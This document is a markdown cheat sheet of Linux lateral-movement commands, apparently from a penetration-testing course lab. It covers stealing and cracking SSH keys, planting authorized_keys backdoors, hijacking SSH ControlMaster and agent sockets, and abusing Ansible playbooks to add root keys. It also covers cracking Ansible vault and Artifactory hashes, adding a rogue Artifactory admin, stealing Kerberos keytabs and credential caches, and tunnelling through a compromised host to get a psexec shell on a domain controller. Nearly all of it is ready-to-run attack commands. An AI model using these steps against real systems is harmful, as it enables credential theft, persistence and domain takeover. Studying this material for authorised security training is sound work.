# Linux Lateral Movement
## Lateral Movement with SSH
### SSH Keys
| Info | Command |
|:-----|:--------|
| Search for ssh key | `find /home/ -name "id_rsa"` |
| Search for files in the home directory | `cd $home; ls -al` |
| Search for other hosts keys may work on (File may be hashed) | `cat ~/.ssh/known_hosts` |
| Search bash history for other hosts connected to with SSH and the same key | `tail .bash_history` |
| Dump SSH key hash with John | `python /usr/share/john/ssh2john.py svuser.key > svuser.hash` |
| Crack SSH key hash with John | `sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash` |

**Example Encrypted Key**
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

### SSH Persistence
| Info | Command |
|:-----|:--------|
| Generate SSH Key | `ssh-keygen` |
| Copy SSH Key to authorized_keys file | `echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys` |
| Set permissions on authorized_keys file if required | `chmod 644 .ssh/authorized_keys` |

### SSH Hijacking with Controlmaster
| Info | Command |
|:-----|:--------|
| Create config file | `nano ~/.ssh/config` |
| Change file permissions | `chmod 644 ~/.ssh/config` |
| Create the required controlmaster directory | `mkdir ~/.ssh/controlmaster` |
| Show sockets | `ls -al ~/.ssh/controlmaster/` |
| Any listed sockets will be available via ssh without a password | `ssh offsec@linuxvictim` |
| Hijack the socket using root | `ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim` |

**Example .ssh/config file**
```
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist 10m
```
### SSH Hijacking Using SSH-Agent and SSH Agent Forwarding
| Info | Command |
|:-----|:--------|
| Copy public key to intermediate server | `ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller` |
| Copy public key to victim server | `ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim` |
| On Kali Ensure 'ForwardAgent yes' is set in SSH config file | `nano ~/.ssh/config` |
| On intermediate server set 'AllowAgentForwarding yes' in SSH config file | `nano /etc/ssh/sshd_config` | 
| Start SSH agent on Kali | `` eval `ssh-agent` `` |
| Add SSH keys to kali | `ssh-add` |
| If root on intermediate search for SSH sessions | `ps aux | grep ssh` |
| Get PID for SSH processes | `pstree -p offsec | grep ssh` |
| cat contents of PID's environment file to search for 'SSHH_AUTH_SOCK' | `cat /proc/16381/environ` |
| Add socket | `SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l` | 
| Run connection | `SH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim` |

## DevOps
### Introduction to Ansible
| Info | Command |
|:-----|:--------|
| Find host inventory | `cat /etc/ansible/hosts` |

### Enumerating Ansible
| Info | Command |
|:-----|:--------|
| Enumerate | `ansible` |
| Check if file exists | `/etc/ansible` |
| Check for ansible related username | `grep ansible /etc/passwd` |

### AD-HOC Commands
| Info | Command |
|:-----|:--------|
| Run an ad-hoc command on the victims group | `ansible victims -a "whoami"` |
| Run an ad-hoc command on the victims group as root | `ansible victims -a "whoami" --become` |

### Ansible Playbooks

**Basic Playbook**
```yaml
---
- name: Get system info
  hosts: all
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
```
| Info | Command |
|:-----|:--------|
| Run ansible playbook | `ansible-playbook getinfo.yml` |

### Exploiting Playbooks for Ansible Credentials

**Basic Playbook specifying account**
```yaml
---
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec
  vars:
    ansible_become_pass: lab
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
```
| Info | Command |
|:-----|:--------|
| Get credential hash from playbook | `python3 /usr/share/john/ansible2john.py ./test.yml` | 
| Crack Ansible hash | `hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt` |
| Decrypt using ansible-vault | `cat pw.txt | ansible-vault decrypt` |

### Weak Permissions on Ansible Playbooks

```yaml
---
- name: Get system info
  hosts: all
  gather_facts: true
  become: yes
  tasks:
  - name: Display info
    debug:
        msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
  - name: Create a directory if it does not exist
    file:
      path: /root/.ssh
      state: directory
      mode: '0700'
      owner: root
      group: root

  - name: Create authorized keys if it does not exist
    file:
      path: /root/.ssh/authorized_keys
      state: touch
      mode: '0600'
      owner: root
      group: root

  - name: Update keys
    lineinfile:
      path: /root/.ssh/authorized_keys
      line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
      insertbefore: EOF
  - name: Run command
    shell: touch /tmp/mycreatedfile.txt
    async: 10
    poll: 0
```

### Sensitive Data Leakage via Ansible Modules
| Info | Command |
|:-----|:--------|
| Check syslog for creds or sensitive data | `cat /var/log/syslog` |

### Artifactory Enumeration
| Info | Command |
|:-----|:--------|
| Search for artifactory process | `ps aux | grep` |

### Compromising Artifactory Backups
| Info | Command |
|:-----|:--------|
| View artifactory backup | `cat /opt/jfrog/artifactory/var/backup/access/access.backup.20200730120454.json` |
| Crack password hash using John | `sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt` |

### Compromising Artifactoryâ€™s Database
| Info | Command |
|:-----|:--------|
| Make a temp directory | `mkdir /tmp/hackeddb` |
| Copy the database to temp directory | `sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb` |
| Change the permissions | `sudo chmod 755 /tmp/hackeddb/derby` |
| Remove any database locks | `sudo rm /tmp/hackeddb/derby/*.lck` |
| Run artifactory version of java to connect to db copy | `sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij` |
| Connect to the copy of the database | `connect 'jdbc:derby:/tmp/hackeddb/derby';` |
| Find users in the database | `select * from access_users;` |

### Adding a Secondary Artifactory Admin Account
| Info | Command |
|:-----|:--------|
| Create bootstrap.creds file | `echo 'haxmin@*=haxhaxhax' > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds` |
| Change permissions for file | `sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds` |
| Stop artifactory process | `sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop` |
| Start artifactory process | `sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start` | 
| Verify account has been created | `sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log` |

## Kerberos on Linux
### General Introduction to Kerberos on Linux
| Info | Command |
|:-----|:--------|
| Login using Domain credentials | `ssh administrator@corp1.com@linuxvictim` |
| Find the user's credential cache file | `env | grep KRB5CCNAME` |
| Acquire a Kerberos ticket-granting ticket (TGT) for the current user | `kinit` |
| List tickets currently stored in the user's credential cache file | `klist` | 
| Get a list of available SPN's | `ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName` |
| Request service ticket | `kvno MSSQLSvc/DC01.corp1.com:1433` |

### Stealing Keytab Files
**Create a sample demonstration keytab for domain Administrator**

| Info | Command |
|:-----|:--------|
| Start ktutil | `ktutil` |
| Add entry to the keytab file | `addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac` |
| Specify file path | `wkt /tmp/administrator.keytab` |
| Quit the utility | `quit` |
| Run a script with domain admin privileges (need read access to the keytab file) | `kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab` |
| Verify that the tickets from the keytab have been loaded | `klist` |
| Renew the tickets if within the renewal timeframe | `kinit -R` |
| Access the domain controller's C drive | `smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$` |

### Attacking Using Credential Cache Files
| Info | Command |
|:-----|:--------|
| List the ccache files in /tmp | `ls -al /tmp/krb5cc_*` |
| Copy the domain administrator's ccache file | `sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow` |
| Set the ownership of the file to offsec user | `sudo chown offsec:offsec /tmp/krb5cc_minenow` |
| Clear old credentials | `kdestroy` |
| Verify credentials no longer exist | `klist` | 
| Set variable to newly copied cache file | `export KRB5CCNAME=/tmp/krb5cc_minenow` |
| List available tickets | `klist` |
| Request a service ticket | `kvno MSSQLSvc/DC01.corp1.com:1433` |
| Verify ticket request | `klist` |

### Using Kerberos with Impacket
| Info | Command |
|:-----|:--------|
| Copy stolen ccache file to Kali VM | `scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow` |
| Set the environment variable | `export KRB5CCNAME=/tmp/krb5cc_minenow` |
| Install Kerberos Linux client utilities, when prompted for a realm & administrative server enter corp1.com | `sudo apt install krb5-user` |
| Verify domain controller can be resolved if not add to hosts file | `host corp1.com` | 
| Edit proxychains.conf and comment out 'proxy_dns' options | `#proxy_dns` |
| Setup socks server on compromised host | `ssh offsec@linuxvictim -D 9050` |
| Run GetADUsers via proxychains (Gets tunnel through compromised host) | `proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator` |
| Get a list of SPNs available to the user | `proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator` |
| Run psexec to get a shell | `proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass` |
